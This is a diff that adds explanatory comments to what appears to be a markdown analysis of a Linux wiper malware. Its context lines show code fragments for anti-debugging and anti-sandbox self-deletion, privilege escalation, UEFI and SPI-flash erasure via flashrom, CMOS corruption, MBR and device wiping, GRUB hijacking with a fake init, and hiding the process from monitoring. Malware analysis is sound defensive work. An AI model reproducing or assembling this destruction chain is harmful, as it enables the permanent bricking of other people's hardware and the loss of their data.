@@ -227,6 +227,8 @@ FLAG_MEM  = _si('-m')
 FLAG_INIT = _si('-i')
 ```
 
+**What it does:** Initializes anti-analysis subsystem — imports low-level modules, detects if running as ELF binary, sets up flags for root/memory/init execution modes, and prepares libc for direct syscalls.
+
 ### 2.2 __die() — Self-Destruction
 
 ```python
@@ -266,6 +268,8 @@ def __die(_=True):
 4. `fsync()` to ensure data is physically written
 5. Delete the file
 6. Fallback to direct removal if rename/overwrite fails
+
+**What it destroys:** Completely removes the script file from disk with anti-forensic overwrite, eliminating all traces of the payload.
 
 ### 2.3 __antidebug() — Debugger Detection
 
@@ -370,6 +374,8 @@ def __antidebug():
 | 5 | `/proc/self/status` | State='T' (tracing), TracerPid≠0 |
 | 6 | Parent process name | gdb, strace, ltrace, valgrind |
 | 7 | Open fd count | >5 fds = debugger attached |
+
+**What it detects & prevents:** Terminates immediately if any debugger, tracer, or analysis tool is attached — protects the payload from reverse engineering.
 
 ### 2.4 __block_sandbox() — VM/Sandbox Detection
 
@@ -609,6 +615,8 @@ def __block_sandbox():
 | Thermal zones | ≥5 | <5 |
 | OS Release | Mainstream distro | Non-standard or missing |
 
+**What it detects & prevents:** Identifies 15+ VM/sandbox indicators (QEMU, VirtualBox, VMware, cloud instances) and self-destructs to avoid analysis.
+
 ### 2.5 Anti-Analysis Execution
 
 ```python
@@ -626,6 +634,8 @@ if BLOCK_SANDBOX:
 
 #END ANTI-ANALYSIS
 ```
+
+**What it does:** Conditionally activates anti-debug and anti-VM protections based on configuration flags. Any failure triggers immediate self-destruction.
 
 </details>
 
@@ -676,6 +686,8 @@ _sync    = os.sync
 | `_fxo` | `os.X_OK` | Execute permission check |
 | `_s_fm` | `0o170000` | File type mask from `st_mode` |
 
+**What it loads:** Core Python modules for process control, threading, I/O, and system calls — the foundation for all destructive operations.
+
 </details>
 
 ---
@@ -702,6 +714,8 @@ def which(
     return name
 ```
 
+**What it does:** Locates system binaries (sudo, flashrom, modprobe, etc.) across standard PATH directories. Returns original name if not found.
+
 ### 4.2 Global Variables
 
 ```python
@@ -727,6 +741,8 @@ if not _isfile(SUDO, _fxo):
 
 URANDOM = mem(array(_urandom(_4mb)))
 ```
+
+**What it initializes:** Process ID, Python interpreter path, thread pool (2x CPU cores), UEFI detection, privilege escalation binary (pkexec or sudo), and a 4MB buffer of cryptographically random data for wiping.
 
 ### 4.3 tmap() — Threaded Map with Timeout
 
@@ -770,6 +786,8 @@ def tmap(
             continue
 ```
 
+**What it does:** Parallel execution engine — maps a function across items using thread pool with timeout, enabling simultaneous wiping of multiple devices/directories.
+
 ### 4.4 cmd() — Execute Shell Command
 
 ```python
@@ -792,6 +810,8 @@ def cmd(
     except Exception:
         return -1
 ```
+
+**What it does:** Silent command execution — runs external programs with all output suppressed, returns exit code. Used extensively for modprobe, flashrom, and system commands.
 
 ### 4.5 mount() — Mount Filesystem
 
@@ -838,6 +858,8 @@ def mount(
     return cmd(args) == 0
 ```
 
+**What it does:** Mounts filesystems with specified flags (rw, remount, bind). Tries libc mount() first, falls back to /bin/mount command. Critical for remounting partitions read-write before destruction.
+
 ### 4.6 umount() — Unmount Filesystem
 
 ```python
@@ -851,6 +873,8 @@ def umount(
 
     return cmd((_umt, b'-l', dst)) == 0
 ```
+
+**What it does:** Unmounts filesystems (lazy unmount with -l flag). Used to detach EFI partition before wiping it.
 
 ### 4.7 File Type Detection
 
@@ -867,6 +891,8 @@ def S_ISCHR(m, _e=0o020000, _f=_s_fm):
 def S_ISLNK(m, _e=0o120000, _f=_s_fm): 
     return (m & _f) == _e
 ```
+
+**What it does:** Fast inode type checks without stat module overhead — identifies regular files, block devices, character devices, and symlinks.
 
 ### 4.8 set_rw() — Set Device Read-Write
 
@@ -894,6 +920,8 @@ def set_rw(
             _cl(d)
 ```
 
+**What it does:** Sends BLKROSET ioctl to remove read-only lock from block devices, allowing destructive writes to protected disks.
+
 ### 4.9 attr() — Remove File Attributes
 
 ```python
@@ -920,6 +948,8 @@ def attr(
             _c(d)
 ```
 
+**What it does:** Strips extended attributes and immutable/append-only flags from files using FS_IOC_SETFLAGS ioctl, preparing protected files for deletion.
+
 ### 4.10 set_immutable() — Set Immutable Flag
 
 ```python
@@ -945,6 +975,8 @@ def set_immutable(
         if fd > -1:
             _c(fd)
 ```
+
+**What it does:** Sets the immutable flag on files (EXT2_IMMUTABLE_FL), preventing even root from modifying or deleting them — used to lock GRUB config after takeover.
 
 </details>
 
@@ -1011,6 +1043,8 @@ def remove_file(
     return True
 ```
 
+**What it destroys:** Overwrites file contents with random data (up to 1MB) before deletion — anti-forensic wiping of individual files.
+
 ### 5.2 iter_dir() — Recursive Directory Iterator
 
 ```python
@@ -1049,6 +1083,8 @@ def iter_dir(
             continue
 ```
 
+**What it does:** Breadth-first directory walker using scandir for speed — yields every file in a directory tree efficiently for parallel processing.
+
 ### 5.3 remove_dir() — Recursive Directory Deletion
 
 ```python
@@ -1061,6 +1097,8 @@ def remove_dir(
 ):
     _dq(_mp(_rm, _it(p)), maxlen=0)
 ```
+
+**What it destroys:** Multi-threaded recursive directory wiper — iterates all files in a tree and overwrites each one with random data using the thread pool. Destroys entire directory structures at maximum speed.
 
 ### 5.4 install_packet() — Cross-Distro Package Installer
 
@@ -1098,6 +1136,8 @@ def install_packet(
 
     return cmd((m, *i, name), timeout=10) == 0
 ```
+
+**What it does:** Auto-detects the Linux distribution's package manager and installs required tools (like flashrom) on-demand. Supports apt, dnf, yum, pacman, zypper, apk, emerge, and xbps.
 
 </details>
 
@@ -1140,6 +1180,8 @@ def get_root():
 3. Execute and exit current process
 4. If `FORCE_ROOT_ACCESS`, retry indefinitely until success
 
+**What it gains:** Root privileges via sudo or pkexec — the gateway to all subsequent kernel, hardware, and firmware destruction.
+
 </details>
 
 ---
@@ -1175,6 +1217,8 @@ def clean_dev(
     return nd[ 0 : i ]
 ```
 
+**What it does:** Strips partition numbers from device names — converts `/dev/sda1` → `/dev/sda`, `/dev/nvme0n1p3` → `/dev/nvme0n1` for whole-disk access.
+
 ### 7.2 get_default_dev() — Fallback Device Detection
 
 ```python
@@ -1196,6 +1240,8 @@ def get_default_dev(part, _e=_isexst):
             
     return mem( b'/dev/sdc' + (b'1' if part else b'') )
 ```
+
+**What it does:** Fallback device discovery — tries common device names (NVMe, SATA, VirtIO, MMC, Xen) when primary detection fails.
 
 ### 7.3 get_mbr_dev() — Detect MBR Device
 
@@ -1231,6 +1277,8 @@ def get_mbr_dev():
     except OSError:
         return None
 ```
+
+**What it discovers:** Identifies the boot disk by reading /proc/self/mounts to find root partition, then verifies MBR signature (0x55AA at offset 510) to confirm it's a legacy boot device.
 
 ### 7.4 get_esp_dev() — Detect EFI System Partition
 
@@ -1302,6 +1350,8 @@ def get_esp_dev():
     return (dev, pth)
 ```
 
+**What it discovers:** Scans all block devices via udev to find the EFI System Partition using its unique GPT GUID. Returns both the device node and mount point for destruction.
+
 </details>
 
 ---
@@ -1343,6 +1393,8 @@ def wipe_efivar(
     except _ex:
         return
 ```
+
+**What it destroys:** Corrupts individual UEFI variables by overwriting their data with random bytes while preserving the header structure — bricks Boot Order, Secure Boot keys, and firmware configuration.
 
 </details>
 
@@ -1408,6 +1460,8 @@ def wipe_dev(
     except _ex:
         return
 ```
+
+**What it destroys:** Overwrites block devices (4MB) and character devices (64KB) with random data. Blacklists critical system devices (nvram, mem, null, etc.) and skips MTD/loop/tty devices (handled elsewhere). Destroys disk contents at the device level.
 
 </details>
 
@@ -1485,6 +1539,8 @@ def SYSCTL():
             continue
 ```
 
+**What it disables:** All kernel security mechanisms — AppArmor, SELinux, Yama, LoadPin, ASLR, ptrace protection, kernel pointer hiding, watchdog, SysRq, kexec, modules signing, core dumps, and panic triggers. Sets all CPUs to performance mode for maximum destruction speed.
+
 </details>
 
 ---
@@ -1534,6 +1590,8 @@ def MODULE():
         cmd(t)
 ```
 
+**What it does:** Phase 1 removes all security modules (LSM), input drivers (keyboard/mouse), hardware monitoring, watchdog timers, and crash storage. Phase 2 loads dangerous modules in permissive mode — /dev/mem with no restrictions, SPI flash writeable, EFI variables exposed, MTD unlocked, NVRAM accessible.
+
 </details>
 
 ---
@@ -1573,6 +1631,8 @@ def MOUNTPOINT():
     else:
         mount(b'efivarfs', EFIVARS, fs=b'efivarfs', flag=(b'rw',))
 ```
+
+**What it does:** Remounts every major filesystem as read-write, including those normally protected. For UEFI systems, mounts the efivarfs to expose firmware variables for destruction.
 
 </details>
 
@@ -1659,6 +1719,8 @@ def MTD():
             continue
 ```
 
+**What it destroys:** Raw flash memory chips (NOR/NAND) — unlocks the device, erases every block using MEMERASE ioctl, then overwrites with random data. Destroys BIOS chips, embedded flash, and firmware storage.
+
 </details>
 
 ---
@@ -1705,6 +1767,8 @@ def CMOS():
     except OSError:
         pass
 ```
+
+**What it destroys:** CMOS memory containing BIOS settings (boot order, clock, hardware config) via three attack vectors — direct NVRAM write, RTC register corruption via ioctl, and port I/O through 0x70/0x71 CMOS access ports. Corrupts RTC alarm, date/time, and all 128 CMOS registers.
 
 </details>
 
@@ -1836,6 +1900,8 @@ def FLASHROM():
     cmd((FLASH, '-p', f'{flags[ "brk" ]},spispeed=128', '-E', '--force', '--ignore-lock'))
 ```
 
+**What it destroys:** The most comprehensive SPI flash attack — disables write protection, clears protection ranges, unlocks all regions, writes 4MB of random data to the BIOS chip, erases every flash region (BIOS, ME, GbE, descriptor, bootblock, EFI variables), attempts 50+ programmer interfaces including external hardware, and emulates chip-specific attacks. This permanently bricks the motherboard firmware.
+
 </details>
 
 ---
@@ -1888,6 +1954,8 @@ def UEFI():
         _sync()
 ```
 
+**What it destroys:** Wipes all UEFI variables simultaneously via thread pool, unmounts the EFI System Partition, overwrites the entire partition device with random data, then recursively deletes all files from ESP as backup. Destroys boot entries, Secure Boot keys, and firmware configuration.
+
 ### 16.2 BIOS() — BIOS/MBR Destruction
 
 ```python
@@ -1909,6 +1977,8 @@ def BIOS():
         return
 ```
 
+**What it destroys:** Locates the MBR boot disk, removes read-only protection, then overwrites the entire disk (starting at sector 0) with 4MB of random data — destroys partition table, bootloader, and filesystem headers.
+
 </details>
 
 ---
@@ -1927,6 +1997,8 @@ def DEVICE():
 
     deque(tmap(wipe_dev, iter_dir(b'/dev')), maxlen=0)
 ```
+
+**What it destroys:** Removes all device mapper mappings (LVM, LUKS, dm-crypt), then iterates every device node under /dev and overwrites block/character devices with random data in parallel using the thread pool. Mass storage destruction at the device level.
 
 </details>
 
@@ -1961,6 +2033,8 @@ def LINUX():
     _sync()
 ```
 
+**What it destroys:** Phase 1 uses 3 processes to simultaneously wipe logs, backups, configs, user data, and boot files. After sync, Phase 2 destroys system binaries and libraries (/usr, /bin, /sbin, /lib*) — leaving the system completely unusable with no executables or shared libraries.
+
 </details>
 
 ---
@@ -1985,6 +2059,8 @@ def RAM():
     except (MemoryError, OverflowError): 
         pass
 ```
+
+**What it destroys:** Exhausts system RAM by allocating 256MB bytearrays in an infinite loop until MemoryError — fills all available memory to trigger OOM killer and system instability.
 
 </details>
 
@@ -2030,6 +2106,8 @@ def BSOD():
     
     memset(0, 1, 1)
 ```
+
+**What it triggers:** Multiple kernel panic vectors — corrupts I/O ports and console buffer, enables panic on oops, triggers SysRq crash (emergency sync+crash), kills PID 1 (init/systemd), then dereferences null pointer via memset. Guarantees system halt.
 
 </details>
 
@@ -2077,6 +2155,8 @@ def run_from_mem():
         _close(md)
 ```
 
+**What it does:** Creates anonymous in-memory file (memfd), copies script contents via zero-copy sendfile, seals the file against modifications, then execs directly from /proc/self/fd — runs entirely from RAM with no disk presence. The original file can be safely deleted.
+
 </details>
 
 ---
@@ -2111,6 +2191,8 @@ def siginit():
         except Exception:
             continue
 ```
+
+**What it does:** Blocks and ignores all catchable signals (including real-time signals and timers) — prevents interruption by SIGTERM, SIGINT, SIGHUP, SIGALRM, etc. Only SIGKILL and SIGSTOP remain as escape hatches.
 
 </details>
 
@@ -2193,6 +2275,8 @@ def init_proc():
         mount(b'/dev/null', b'/proc/self/' + i, fs=None, flag=(b'bind',))
 ```
 
+**What it does:** Verifies tamper-detection variables, sets highest real-time priority (SCHED_FIFO, nice -20), disables core dumps, maximizes locked memory and file descriptors, renames process to "[kworker/0:N]" (hides as kernel worker), disables dumpable flag and Yama, locks all memory in RAM, makes process OOM-killer immune, minimizes timer slack, and bind-mounts /dev/null over /proc/self/* to hide process information from monitoring tools.
+
 </details>
 
 ---
@@ -2249,6 +2333,8 @@ def BlockInput(
                 node = parent
                 i -= 1
 ```
+
+**What it blocks:** Grabs all /dev/input event devices via EVIOCGRAB ioctl (prevents other processes from receiving input), then walks /sys/class/input and unbinds drivers from hardware — disables keyboard, mouse, touchpad, and other HID devices. Tries up to 4 parent levels to find and disconnect the driver.
 
 </details>
 
@@ -2328,6 +2414,8 @@ mount -t tmpfs       tmpfs       /tmp -o mode=1777    2>/dev/null
         f'init={path_init}'
     )
 ```
+
+**What it creates:** A fake init script at /sbin/.init that mounts essential filesystems and immediately executes the payload with PID 1 privileges. Returns kernel command line with all security mitigations disabled (SELinux, AppArmor, Lockdown, SMAP/SMEP, KASLR, mitigations, IOMMU, watchdog) for maximum destructive capability.
 
 ### 25.2 setup_grub() — Overwrite GRUB Configuration
 
@@ -2473,6 +2561,8 @@ menuentry "GNU/Linux, with {rel}" --unrestricted --class gnu-linux --class os {{
     return True
 ```
 
+**What it hijacks:** Discovers GRUB config files, generates malicious configuration that boots with custom init and all security disabled, overwrites grub.cfg with password protection (random 16-byte hex), sets immutable flag to prevent restoration, deletes /etc/fstab and GRUB backup configs, then force-reboots via SysRq or reboot -f.
+
 ### 25.3 GRUB_INIT() — GRUB Takeover Entry Point
 
 ```python
@@ -2483,6 +2573,8 @@ def GRUB_INIT():
     if setup_grub():
         _exit(0)
 ```
+
+**What it triggers:** Entry point for GRUB takeover — if FLAG_INIT is not set (first run), executes the full GRUB compromise chain and exits. On next boot, runs as init with PID 1.
 
 </details>
 
@@ -2535,6 +2627,8 @@ def _start(m=main):
 globals()['_start'].__name__=''
 ```
 
+**What it initializes:** The obfuscated entry point — verifies integrity, disables warnings/logging/tracing/garbage collection, escalates to root, optionally hijacks GRUB, loads into memory if not ELF, blocks user input, and initializes process with maximum stealth and priority.
+
 ### 26.2 main() — Main Destruction Sequence
 
 ```python
@@ -2582,6 +2676,22 @@ def main(_=...):
 globals()['main'].__name__=''
 ```
 
+**Destruction sequence (in order):**
+1. **SYSCTL** — Disable kernel hardening
+2. **MODULE** — Remove security modules, load dangerous ones
+3. **MOUNTPOINT** — Make all filesystems writable
+4. **Self-delete** — Remove script from disk
+5. **MTD** — Destroy flash memory chips
+6. **CMOS** — Corrupt BIOS settings
+7. **FLASHROM** — Brick motherboard firmware
+8. **UEFI/BIOS** — Destroy boot chain
+9. **DEVICE** — Wipe all block devices
+10. **LINUX** — Delete all files
+11. **RAM** — Exhaust memory
+12. **BSOD** — Trigger kernel panic
+
+Each step continues on failure — no single failure stops the chain. Ends with guaranteed system death via kernel panic.
+
 ### 26.3 Program Entry Point
 
 ```python
@@ -2601,6 +2711,8 @@ if(__name__=='__main__'):
             try:raise(SystemError((0,memset(0,1,1),0,_exit(0),0)[0]))
             finally:raise(SystemExit(0))
 ```
+
+**What it does:** Final tamper verification, then launches _start() through obfuscated exception handling — makes static analysis extremely difficult while ensuring the payload executes.
 
 </details>
 
